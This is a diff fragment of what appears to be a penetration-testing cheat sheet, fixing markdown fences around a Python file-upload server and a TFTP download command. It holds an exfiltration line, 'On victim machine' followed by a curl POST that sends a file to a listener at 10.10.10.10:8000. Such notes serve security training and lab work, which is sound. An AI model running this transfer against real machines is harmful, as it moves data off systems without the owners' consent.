@@ -1529,6 +1529,7 @@ Tftp -I <ip_address> GET <file_name>
 dir
 
 ### PYTHON UPLOAD SERVER
+
 ```
 #!/usr/bin/env python3
 from http.server import HTTPServer, BaseHTTPRequestHandler
@@ -1563,12 +1564,12 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             self.send_response(400)
             self.end_headers()
             self.wfile.write(b"No file uploaded.")
-
+      
 httpd = HTTPServer(('0.0.0.0', 8000), SimpleHTTPRequestHandler)
 httpd.serve_forever()
+```
 
-
-
+```
 On victim machine - curl -X POST -F "file=@output.txt" http://10.10.10.10:8000/
 ```
 
